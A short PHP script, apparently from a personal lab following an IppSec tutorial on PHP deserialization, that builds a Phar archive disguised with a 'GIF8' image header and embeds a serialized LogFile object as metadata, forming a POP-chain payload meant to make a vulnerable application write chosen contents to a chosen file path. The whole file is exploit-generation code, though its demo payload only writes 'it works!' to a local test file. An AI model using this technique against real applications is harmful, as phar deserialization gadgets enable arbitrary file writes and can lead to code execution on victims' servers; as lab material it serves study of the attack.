<?php
// Create the POP Chain
class LogFile
{
    public function __construct(){
        $this->filename = '/home/tsvetkoff/Programming/Github_repos/IppSec-PHP-Deserialization/file.txt';
        $this->fcontents = 'it works!';
    }
}

//Create the Phar Archice
$phar = new \Phar("test.phar");
$phar->startBuffering();
$phar->setStub("GIF8;<?php __HALT_COMPILER(); ?>");

//Begin of serialization
$payload = new LogFile();
$phar->setMetadata($payload);

//Zip file within the Phar Archive
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
?>